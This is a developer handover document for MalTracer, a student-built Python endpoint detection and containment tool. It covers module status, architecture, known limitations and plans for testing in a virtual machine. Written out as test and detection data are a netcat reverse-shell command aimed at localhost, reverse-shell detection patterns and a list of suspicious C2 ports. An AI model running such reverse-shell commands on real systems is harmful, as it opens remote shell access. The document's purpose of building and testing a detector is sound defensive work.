# MalTracer — Handover Document v4
**Date:** 2026-06-20
**Tests:** 85/85 passing
**Status:** Feature-complete for Windows VM testing. Linux cross-platform edits applied. Containerization deferred.

---

## What to send to the next chat

**Upload these two files:**
1. `MalTracer_v2.zip` — full codebase
2. `MALTRACER_HANDOVER_v4.md` — this file

**Paste this opening message:**

```
I'm continuing development of MalTracer, a Python endpoint threat detection
and containment tool. I'm uploading the codebase ZIP and handover document.

Critical constraints before touching anything:
- Windows: run CMD as Administrator. Linux: run with sudo.
- Run `python -m pytest tests/ -v` first — must be 85/85 before any changes.
- Do NOT rewrite: containment/, core/event_bus.py, core/incident_manager.py, logging_system/
- All paths come from utils/constants.py — never hardcode APPDATA or ~ directly.
- Windows uses netsh/psutil. Linux uses iptables/psutil. No bash, no zenity, no iptables on Windows.
- The Electron popup (electron_popup/) is the UI for --monitor and --simulate. tkinter is NOT used.

Read this handover document fully before writing any code.
```

---

## Current state — what works

### Fully working — do not touch
| Module | Status | Notes |
|--------|--------|-------|
| `core/event_bus.py` | ✅ Complete | Thread-safe pub/sub, non-blocking publish, per-handler exception isolation |
| `core/incident_manager.py` | ✅ Complete | State machine OPEN→CONTAINED/DISMISSED/FAILED→CLOSED, JSON persistence, atomic writes |
| `core/engine.py` | ✅ Complete | Stamps incident_id BEFORE calling open() — bug fixed in this session |
| `utils/constants.py` | ✅ Complete | Platform-aware paths (APPDATA on Windows, ~/.maltracer on Linux) |
| `containment/process_killer.py` | ✅ Complete | psutil cross-platform, tree kill, protects system PIDs |
| `containment/quarantine_manager.py` | ✅ Complete | Platform-aware paths, SHA-256 manifest, restore() support |
| `containment/network_blocker.py` | ✅ Complete | netsh on Windows, iptables on Linux, rule tagged by incident_id |
| `containment/containment_engine.py` | ✅ Complete | Field alias fix: reads dst_ip OR remote_ip, destination OR file_path OR process_path |
| `detection_engine/` | ✅ Complete | 30 rules loaded, score < 40 = LOW, 40–79 = MEDIUM, ≥ 80 = HIGH |
| `logging_system/` | ✅ Complete | Known harmless SyntaxWarning on `\l` in logger.py docstring — ignore it |
| `electron_popup/main.js` | ✅ Complete | EPIPE crash fixed, contain/dismiss keeps window alive, movable window |
| `electron_popup/popup.html` | ✅ Complete | 3 screens (Dashboard/Alerts/Scan Email), live polling port 7474, detail panel |
| `tests/simulate_from_logs.py` | ✅ Complete | Enriches raw logs, launches Electron (not tkinter), HTTP server port 7474 |

### Cross-platform — updated this session
| File | Changes made |
|------|-------------|
| `monitoring/file_monitor.py` | `is_admin()` now uses `os.geteuid()==0` on Linux; platform-aware extensions (.elf/.sh/.py on Linux); platform-aware watch paths (/tmp, /var/tmp, /dev/shm on Linux); platform-aware admin-only paths |
| `monitoring/process_monitor.py` | Platform-aware TRUSTED_PROCESSES, TRUSTED_PATHS, SUSPICIOUS_PATHS, LOLBINS; `detect_powershell_attack()` now also catches Linux reverse shell patterns (/dev/tcp/, base64.b64decode, 0>&1) |
| `monitoring/network_monitor.py` | SUSPICIOUS_PORTS expanded from 5 to 13 ports: added Tor (9050/9150), IRC C2 (6667/6697), common reverse shell ports (1234, 4545, 8888, 3333) |

---

## Architecture — data flow

```
monitors (process / file / network)
    │  callback → event_bus.publish(event)
    ▼
EventBus dispatcher thread
    │
    ├──▶ core/engine.py._on_event()
    │       1. stamp incident_id if missing
    │       2. incident_manager.open(event)
    │       3. detection_engine.process_event(event)
    │               │ score + classify
    │               └──▶ containment_engine.handle(event)
    │                       LOW    → log only
    │                       MEDIUM → Electron popup (user decides)
    │                       HIGH   → auto: kill + quarantine + block IP
    │
    └── incident persisted to disk as INC-YYYYMMDD-xxxxxxxx.json

simulate_from_logs.py (--simulate mode)
    │ enriches raw log events with realistic threat metadata
    │ launches electron_popup/ as subprocess
    └──▶ HTTP server port 7474
              └──▶ popup.html polls /events every 1.5s → renders live alerts
```

---

## Known issues / limitations

### Minor (harmless)
- `logging_system/logger.py` line 1: `\l` in docstring causes `SyntaxWarning`. Fix: change `\logs` to `/logs`. Does not affect functionality.
- Pylance marks the Linux `else` branch of `is_admin()` as "unreachable" when running on Windows. This is a false positive — the code is correct.

### Testing limitations
- **YARA rules not implemented** — the detection engine uses text-based rules only. Sophisticated malware with obfuscated names, legitimate-looking process names, or port 443 C2 traffic may not be caught unless multiple behavioral rules combine to a score ≥ 40.
- **Network blocking requires admin** — without it, block_ip() returns False silently and logs an error. The rest of containment (kill + quarantine) still works.
- **Electron popup requires Node.js** — if Node.js is not installed, `--simulate` falls back gracefully (prints a message, events still go to HTTP server, dashboard still works).

### Deferred tasks
- **Containerization** — Docker setup deferred until after VM testing. Reason: psutil sees host processes from inside a container, Electron needs a display server, iptables/netsh need elevated container privileges. Plan: Dockerfile for headless Python backend, Electron runs on host connecting via port 7474.
- **YARA integration** — add `yara-python` and a `/rules/yara/` folder. Hook into `detection_engine/engine.py` after text rule scoring.
- **Reporter** — `core/reporter.py` to generate JSON/text summary from `incident_manager.get_all()`. Hook into `maltracer.py --report`.
- **Filter tab persistence in Electron** — currently resets to "All" when a new live event arrives.

---

## How to run — quick reference

```bash
# Install deps (once)
pip install psutil watchdog plyer pytest

# Tests
python -m pytest tests/ -v   # expect 85 passed

# Live monitoring
# Windows (Admin CMD):
python maltracer.py --monitor

# Linux:
sudo python maltracer.py --monitor

# Simulation (no admin needed)
python maltracer.py --simulate --delay 2

# Open HTML dashboard in browser
python maltracer.py --dashboard

# Check incident counts
python maltracer.py --status
```

---

## File inventory (Python source only)

```
maltracer.py
core/__init__.py
core/engine.py
core/event_bus.py
core/incident_manager.py
utils/__init__.py
utils/constants.py
monitoring/__init__.py
monitoring/file_monitor.py          ← cross-platform edits applied
monitoring/network_monitor.py       ← port list expanded
monitoring/process_monitor.py       ← cross-platform edits applied
detection_engine/__init__.py
detection_engine/engine.py
detection_engine/scoring.py
detection_engine/classifier.py
detection_engine/rule_engine.py
detection_engine/rule_parser.py
detection_engine/rules/file.rules
detection_engine/rules/network.rules
detection_engine/rules/process.rules
containment/__init__.py
containment/containment_engine.py   ← field alias fix (dst_ip, destination, process_path)
containment/process_killer.py
containment/quarantine_manager.py
containment/network_blocker.py
alerts/__init__.py
alerts/popup_handler.py
logging_system/__init__.py
logging_system/logger.py
logging_system/log_formatter.py
logging_system/message_builder.py
tests/simulate_from_logs.py         ← launches Electron, not tkinter
tests/simulate_threat.py
tests/test_containment_engine.py    (10 tests)
tests/test_event_bus.py             (17 tests)
tests/test_incident_manager.py      (30 tests)
tests/test_network_blocker.py        (7 tests)
tests/test_process_killer.py        (11 tests)
tests/test_quarantine_manager.py    (10 tests)
electron_popup/main.js              ← EPIPE fix, no forced position lock
electron_popup/popup.html           ← 3-screen UI, live polling, no contain overlay
electron_popup/preload.js
dashboard/maltracer_dashboard.html
logs/2026-03-13_edr_logs.json
```

---

## Priority queue for next session

1. **Test on Windows VM with real malware** — the primary goal
   - Run `python maltracer.py --monitor` as Administrator
   - Drop a suspicious executable in Downloads — file monitor should catch it
   - Run something from AppData\Temp — process monitor should catch it
   - Verify Electron popup opens for MEDIUM events and process is killed for HIGH

2. **Test on Linux VM**
   - `sudo python maltracer.py --monitor`
   - Verify file_monitor watches /tmp correctly
   - Test with a simple netcat reverse shell: `nc -e /bin/bash 127.0.0.1 4444`

3. **Add YARA rules** (after VM testing confirms base pipeline works)
   - `pip install yara-python`
   - Create `detection_engine/rules/yara/` folder
   - Hook `yara.match()` into `detection_engine/engine.py.process_event()`

4. **Containerization** (after all VM testing complete)
   - `Dockerfile` for headless Python backend
   - Electron runs on host, connects to container via port 7474

---

## Team
Mohamed Yahia · Marwan Samy · Rodina Mohamed · Youssef Samir · Shenoda Amir
